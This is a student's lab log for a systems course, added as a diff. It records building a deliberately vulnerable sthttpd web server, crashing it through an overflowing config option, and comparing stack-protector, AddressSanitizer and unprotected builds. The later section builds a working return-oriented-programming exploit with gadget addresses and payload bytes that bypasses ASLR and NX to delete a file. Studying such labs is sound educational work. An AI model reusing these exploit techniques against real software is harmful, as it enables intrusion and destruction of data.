@@ -1,0 +1,469 @@
+1.
+How to make sure that /usr/local/cs/bin is at the start of PATH?
+Adding "export PATH=$PATH:/usr/local/cs/bin" to ~/.profile did not work, as it 
+only appeared at the end of PATH
+Had to first put "unset PATH" before the "export PATH" line, because I was 
+unable to find where the PATH variable is originally set. Unsetting it and 
+resetting it does the trick.
+$ which gcc
+/usr/local/cs/bin/gcc
+
+2.
+Used wget to aquire the .tar.gz for sthttpd, and "tar -xzvf *.tar.gz" to 
+extract the files. Manually edited sthttpd-2.27.0\src\thttpd.c
+The patch only indicates two lines were modified, so I modified those two lines
+
+Used ./configure with the CFLAGS and LDFLAGS given in the lab manual, and then 
+compiled it accordingly
+$ ./configure \
+  CFLAGS='-m32' \
+  LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+$ make CFLAGS='-m32 -g3 -O2 -fno-inline -fstack-protector-strong'
+$ mv src/thttpd src/thttpd-sp
+$ make clean
+$ make CFLAGS='-m32 -g3 -O2 -fno-inline -fsanitize=address'
+$ mv src/thttpd src/thttpd-as
+$ make clean
+$ make CFLAGS='-m32 -g3 -O2 -fno-inline'
+$ mv src/thttpd src/thttpd-no
+$ make clean
+
+Then I moved the three thttpd ELFs to a different folder
+
+3.
+The port number for my ID for SP is 12543, AS is 12544, NO is 12545. 
+
+4.
+Made a file foo.txt in the directory
+
+$ thttpd-sp -p 12543 -D
+$ curl http://localhost:12543/foo.txt
+Test
+
+The other two also work as expected
+
+5.
+Crashing the server?
+First tried to curl an extremely long filename from the server
+
+$ curl
+http://localhost:12543/foooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo.txt
+
+Didn't work.
+Then tried to launch thttpd with very long args
+
+./thttpd-sp -p 12543
+-Dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
+
+Didn't work
+
+Probably a good idea to actually look at what the patch to the source code
+changed
+read_config looks like it's used to read a config file, so it's probably a
+good idea to launch GDB and breakpoint on the function
+
+$ gdb --args thttpd-sp -p 12543 -D
+(gdb) b read_config
+(gdb) r
+
+No breaks. Quick search indicates that [-C configfile] needs to be specified
+Entered a bunch of junk into file "config"
+
+$ ./thttpd-sp -C config -p 12543 -D
+./thttpd-sp: unknown config option '(bunch of junk here)'
+
+Need to read the man page a little bit more...
+
+$ echo "port=3209849032847y98327489327498327984329784783279849783247983279849328779843279832497843297898732497843297842387" > "config"
+$ ./thttpd-sp -C config -D
+*** stack smashing detected ***: ./thttpd-sp terminated
+
+Success.
+
+$ gdb --args thttpd-sp -C config -D
+(gdb) r
+(gdb) bt
+#0  0x00110430 in __kernel_vsyscall ()
+#1  0x002d6871 in raise () from /lib/libc.so.6
+#2  0x002d814a in abort () from /lib/libc.so.6
+#3  0x00316735 in __libc_message () from /lib/libc.so.6
+#4  0x003a8dad in __fortify_fail () from /lib/libc.so.6
+#5  0x003a8d5a in __stack_chk_fail () from /lib/libc.so.6
+#6  0x0804b69f in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x0804b9fa in parse_args (argc=argc@entry=4, argv=argv@entry=0xffffd5a4)
+    at thttpd.c:893
+#8  0x0804d255 in main (argc=4, argv=0xffffd5a4) at thttpd.c:380
+
+The instructions that invoke __stack_chk_fail, which crashes thttpd:
+0x804b603<read_config+1283>:    mov 0x7c(%esp), %eax
+0x804b607<read_config+1287>:    xor %gs:0x14, %eax
+0x804b60e<read_config+1294>:    jne 0x804bg9a <read_config+1434>
+0x804b69a<read_config+1434>:    call 0x8049b68 <__stack_chk_fail@plt>
+Appears to use a stack canary.
+
+6.
+thttpd-as crashes with the same config file.
+$ gdb --args thttpd-as -C config -D
+(gdb) b read_config
+(gdb) r
+
+Stepped through till thttpd.c:1018, at which __interceptor_strchr of
+libsanitizer took over control of the program and crashed it.
+Backtrace provided by ASan:
+
+#0 0x2d6ed0 in __interceptor_strchr
+../../../../../gcc-4.9.2/libsanitizer/asan/asan_interceptors.cc:417
+#1 0x804da6f in read_config
+/u/ee/ugrad/elton/Documents/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:1018
+#2 0x804e603 in parse_args
+/u/ee/ugrad/elton/Documents/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:893
+#3 0x80530a1 in main
+/u/ee/ugrad/elton/Documents/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:380
+#4 0x7bfd35 in __libc_start_main (/lib/libc.so.6+0x2c2d35)
+#5 0x804cb28
+(/w/home.01/ee/ugrad/elton/Documents/cs33/lab3/thttpd/thttpd-as+0x804cb28)
+
+Which instructions crash the program?
+In the backtrace for thttpd-as -C rop_final -D is the function
+uw_frame_state_for... Which makes a lot of syscalls and eventually
+sends signal SIGSEGV and then libasan has a signal handler for SIGSEGV and
+then more stuff done by the library happens before crashing the program.
+
+7.
+thttpd-no crashes with a different config file.
+
+$ cat config3
+port=0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+
+This one corrupts the stack to an extent such that the backtraces contain
+bogus data.
+The backtrace for thttp-sp when run with this config file:
+
+(gdb) bt
+#0  uw_frame_state_for (context=context@entry=0xffffbaf8,
+    fs=fs@entry=0xffffbb78) at ../../../../gcc-4.9.2/libgcc/unwind-dw2.c:1253
+#1  0x00158b20 in _Unwind_Backtrace (trace=0x3a5670 <backtrace_helper>,
+    trace_argument=0xffffbc54) at ../../../../gcc-4.9.2/libgcc/unwind.inc:290
+#2  0x003a5865 in backtrace () from /lib/libc.so.6
+#3  0x0031674b in __libc_message () from /lib/libc.so.6
+#4  0x003a8dad in __fortify_fail () from /lib/libc.so.6
+#5  0x003a8d5a in __stack_chk_fail () from /lib/libc.so.6
+#6  0x0804b69f in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x30303030 in ?? ()
+#8  0x30303030 in ?? ()
+#9  0x30303030 in ?? ()
+#10 0x30303030 in ?? ()
+...
+#21 0x30303030 in ?? ()
+#22 0x00303030 in _IO_vfscanf_internal () from /lib/libc.so.6
+Backtrace stopped: previous frame inner to this frame (corrupt stack?)
+
+How to get the backtrace for thttpd-no?
+
+$ gdb --args thttpd-no -C config3 -D
+(gdb) r
+Starting program:
+/w/home.01/ee/ugrad/elton/Documents/cs33/lab3/thttpd/thttpd-no -C config3 -D
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x30303030 in ?? ()
+(gdb) bt
+#0  0x30303030 in ?? ()
+#1  0x30303030 in ?? ()
+#2  0x30303030 in ?? ()
+#3  0x30303030 in ?? ()
+#4  0x30303030 in ?? ()
+#5  0x30303030 in ?? ()
+#6  0x30303030 in ?? ()
+#7  0x30303030 in ?? ()
+#8  0x30303030 in ?? ()
+#9  0x30303030 in ?? ()
+#10 0x30303030 in ?? ()
+#11 0x30303030 in ?? ()
+#12 0x30303030 in ?? ()
+#13 0x30303030 in ?? ()
+#14 0x30303030 in ?? ()
+#15 0x30303030 in ?? ()
+#16 0x00303030 in _IO_vfscanf_internal () from /lib/libc.so.6
+Backtrace stopped: previous frame inner to this frame (corrupt stack?)
+
+The assembly that causes the crash:
+
+0x804b4a4<read_config+1252>:    sub $0xc,%esp
+0x804b4b0<read_config+1264>:    add $0x9c,%esp
+0x804b4b6<read_config+1270>:    pop %ebx
+0x804b4b7<read_config+1271>:    pop %esi
+0x804b4b8<read_config+1272>:    pop %edi
+0x804b4b9<read_config+1273>:    pop %ebp
+9: /x *(int *) $esp = 0x30303030
+0x804b4ba<read_config+1274>:    ret
+0x30303030 in ?? ()
+9: /x *(int *) $esp = 0x30303030
+=> 0x30303030:  <error: Cannot access memory at address 0x30303030>
+
+Examining $esp indicates that the stack was corrupted and the return address
+was overwritten.
+
+8.
+To compile the assembly files:
+$ gcc -I. -I.. -m32 -S -O2 -fno-inline -fstack-protector-strong thttpd.c -o
+thttpd-sp.s -Xlinker --rpath=/usr/local/cs/gcc-4.9.2/lib
+$ gcc -I. -I.. -m32 -S -O2 -fno-inline -fsanitize=address thttpd.c -o
+thttpd-as.s -Xlinker --rpath=/usr/local/cs/gcc-4.9.2/lib
+$ gcc -I. -I.. -m32 -S -O2 -fno-inline thttpd.c -o thttpd-no.s -Xlinker
+--rpath=/usr/local/cs/gcc-4.9.2/lib
+
+The -fstack-protector-strong and no protection handle_read are identical, as
+handle_read does not use any arrays.
+The one using -fsanitize=address was a lot longer than the other two, as it
+instrumented memory accesses done by the function, resulting in a significant
+incresae in code size.
+
+-fstack-protector-strong uses a canary to prevent buffer-overrun exploits.
+The canary is added under many conditions that could lead to a buffer
+overflow, including a local variable's address being used as a function
+argument or being assigned to a variable, or an array being in the function
+either standalone or in a union or struct.
+The code implementing this will look similar to
+    movl 44(%esp), %eax
+    xorl %gs:20, %eax
+    jne .L517
+.L517:
+    call __stack_chk_fail
+The canary is retrieved from its position on the stack and is compared to
+%gs:20, which contains what the canary is supposed to be equal to. If they
+aren't equal to each other, then the program crashes.
+
+-fsanitize=address works by wrapping all arrays created on the stack in
+poisoned redzones. If the redzones are modified, they will not match their
+corresponding metadata, signaling libasan to get a backtrace through a set of
+reporting functions, such as __asan_report_load4, and crash.
+
+So the lab manual says that there should be no more than 200 columns per line.
+But for the assembly files, there is a string literal that is greater than 200
+characters, and GCC/GAS does not support multiline string literals in assembly
+files (in inline ASM in a C file it is supported through the C syntax for
+multiline string literals, but this is a .s file)
+
+9.
+How to craft the exploit?
+
+Note: I'm running on lnxsrv05, but the server my final exploit runs on should not
+matter.
+
+Need the address of the char line[100] array
+(gdb) print (int *)line
+$2 = (int *) 0xffffc2dc
+As x86 is little-endian, the address needs to be reversed to dcc2ffff when
+written to the exploit file
+However, instead of using that address I will craft the exploit first and
+point specifically to the first line of assembly without a nop-sled
+Need to generate assembly to remove file
+Inserting a quick 
+
+remove("target.txt");
+
+into thttpd.c and compiling it and disassembling read_config gets these two 
+important lines 
+
+0x0804b00c <+12>:    push   $0x80558a7
+0x0804b011 <+17>:    call   0x8049b24 <remove@plt>
+
+(gdb) x/5xb $pc
+0x804b00c <read_config+12>:     0x68    0xa7    0x58    0x05    0x08
+(gdb) x/5xb $pc+5
+0x804b011 <read_config+17>:     0xe8    0x0e    0xeb    0xff    0xff
+
+(gdb) x/s 0x80558a7
+0x80558a7:      "target.txt"
+
+So the exploit payload must include the string for the file
+I have "target.txt" at address 0xffffc384, so the asm for push needs to be
+
+push $0xffffc384
+
+Determining these addresses consisted of loading stuff into the exploit file
+and then doing x/170b 0xffffc2dc to determine where that stuff ended up
+
+And then it turns out that the NX bit is enabled (tested with a nop sled), so
+exploiting the bug through this method is impossible. 
+Sad day :(
+One way to enable the bug to be exploitable is to add the CFLAG '-z execstack'
+I compiled this executable as thttpd-es
+
+Once the address of the "target.txt" string has been pushed on the stack,
+remove needs to be called
+To get the address of libc's remove, can load up the executable in gdb and then
+
+(gdb) print remove
+$5 = {<text variable, no debug info>} 0x30a690 <remove>
+
+Need to calculate the difference between the next instruction's address and
+remove's address, and then stick that into the hex for call.
+
+call 0x30a690
+
+So the two lines of assembly that matter are
+push $0xffffc384            68 84 c3 ff ff
+call 0x30a690               e8 76 e3 30 00
+
+And then launch thttpd-es -C xploit -D (thttpd-no compiled with -z execstack)
+and target.txt is deleted!
+
+Except that only works when GDB is used to start the program. When GDB runs
+the stack is shuffled around by about 30, so it's impossible to rely on the
+"target.txt" string being in the proper place. Instead, need to generate more
+asm to copy "target.txt" into a stable place, which would be the beginning of
+the char array line[]
+
+movl    $0xffffc2dc, %eax 
+movl    $0x67726174, (%eax)
+movl    $0x742e7465, 4(%eax)
+movl    $0x00007478, 8(%eax)
+push    $0xffffc2dc
+call    0x30a690
+
+Time to try this outside of GDB... 
+Nope. Fails. Turns out ASLR is turned on.
+
+$ cat /proc/sys/kernel/randomize_va_space
+2
+
+2 indicates full randomization. Normally, with ASLR+DEP this style of exploit
+is unlikely to work, need to do return to libc for the exploit
+It only works in GDB because GDB disables ASLR for the program being debugged.
+Very sad day :(
+ 
+To make GDB tracing less confusing, used
+(gdb) display/i $pc
+(gdb) display/x *(int*)$esp
+(gdb) display/x $esp
+
+So instead,
+Created a return-to-plt with execve... The stack needs to be organized in a
+specific way in order for the syscall to succeed.
+I found out how to craft the stack so that it effecitvely calls 
+execve("/usr/local/cs/bin/rm", {"/usr/local/cs/bin/rm", "target.txt", NULL}, NULL);
+Works in GDB, but.. outside of gdb, still doesn't work due to ASLR, because
+the stack's location is randomized every time. 
+
+Need to do return oriented programming to bypass ASLR.
+
+So with ROP,
+I need to chain gadgets to copy the strings to a stable location on each
+run. Before running the program in gdb, need to find functions that have the
+same address regardless of run.
+
+$ gdb thttpd-no
+(gdb) print strncpy
+$1 = {<text variable, no debug info>} 0x80497ac <strncpy@plt>
+(gdb) print execve
+$2 = {<text variable, no debug info>} 0x8049afc <execve@plt>
+
+Since these functions are in the plt, can rely on them to exist even with ASLR
+enabled.
+After some googling found something called ROPgadget that helps with creating
+ROP exploits.
+
+How to call strncpy from asm? It would look something like this:
+
+pushl size_of_string
+pushl source
+pushl dest
+call strncpy
+
+So the stack has to be manipulated to appear this way to strncpy before it
+gets returned to. We have full control of the stack due to the
+buffer overflow, so the memory would look something like
+esp ---> AC 97 04 08   12 34 56 78  DE AD BE EF BE EF DE AD 08 00 00 00
+         ^&strncpy@plt ^&next_gdgt  ^DEST       ^SOURCE     ^SIZE
+before the ret occurs
+strncpy would do the copy, and then it returns to &next_gdgt.
+ 
+So have to find strings in thttpd-no with constant addresses that can be strncpy'd to create the strings required for execve
+
+ROPgadget.py --binary thttpd-no --string "bin"
+Strings information
+============================================================
+0x08048e38 : bin
+0x08055ee0 : bin
+0x080563ad : bin
+0x0805664c : bin
+0x0805755b : bin
+....
+
+etc. etc.
+
+What's a place whose address is constant regardless of ASLR?
+.bss section - address 0x0805f3c0
+
+Gotten using (gdb) info files
+
+Need gadget to manage stack.. using 
+ROPgadget.py --binary thttpd-no --only "pop|ret"
+-----
+0x08049e16: pop ebx ; pop esi ; pop edi  ; pop ebp ; ret
+-----
+
+This gadget advances the stack an appropriate amount.  This is necessary because
+the params of strncpy take up 3 parts of the stack, so need to advance stack 
+pointer past those parts to continue gadget chaining
+
+AC 97 04 08 16 9E 04 08 C0 F3 05 08 44 90 04 08 0E 00 00 00   18 18 18 18
+^STRNCPY@plt^STACKgadget^.bss       ^str src    ^sizeofstring ^filler
+I copy and paste this repeatedly with different params for src, dest, and
+size, to chain strncpy
+
+In order to figure out how execve expects the stack to be formatted, I
+made an executable whose main consists of a call to execve and ran it with
+gdb.
+
+(gdb) b execve
+(gdb) r
+(gdb) x/16wx $esp
+0xffffd4dc:     0x08048456      0x08048538      0xffffd4f4      0x00000000
+0xffffd4ec:     0x08048499      0x0043d1d8      0x08048538      0x0804854d
+0xffffd4fc:     0x00000000      0x08048480      0xffffd520      0xffffd598
+(gdb) x/s *0xffffd4f4
+0x8048538:      "/usr/local/cs/bin/rm"
+(gdb) x/s *(0xffffd4f4 + 4)
+0x804854d:      "target.txt"
+
+$esp+4 is the address of the first argument.
+$esp+8 is the address of the array of pointers to C-strings.
+$esp+12 has to be 0x00000000.
+*($esp+8) is the address of the first argument. 
+*($esp+8) + 4 is the address of the second argument.
+*($esp+8) + 8 is the address of the third argument.
+
+So after chaining strncpy's to recreate this C array
+{"/usr/local/cs/bin/rm", "target.txt", NULL};
+
+I need to strncpy strings that happen to contain the bytes needed to form the
+pointers I want.
+
+ROPgadget.py --binary thttpd-no --string "\xc0\xf3\x05\x08"
+Strings information
+============================================================
+0x0804886c : +?   ? ? "?
+
+That string is the pointer to the first argument, which resides at the address
+of the .bss segment.
+After some more strncpy chaining and searching for suitable bytes using
+ROPgadget, the memory is laid out appropriately.
+
+The last parts of the config file look like this:
+FC 9A 04 08 00 00 00 00 C0 F3 05 08         E4 F3 05 08             00 00 00 00
+^ &execve   ^junk       ^ptr to first arg   ^addr of ptr tofirst arg^required
+This exploit works with both ASLR and the NX-bit turned on, and resides in the
+file "config.cfg"
+
+Here's what it looks like when it's run:
+
+[elton@lnxsrv05 ~/Documents/cs33/lab3/thttpd]$ ls | grep "target.txt"
+target.txt
+[elton@lnxsrv05 ~/Documents/cs33/lab3/thttpd]$ thttpd-no -C config.cfg -D
+[elton@lnxsrv05 ~/Documents/cs33/lab3/thttpd]$ ls | grep "target.txt"
+[elton@lnxsrv05 ~/Documents/cs33/lab3/thttpd]$
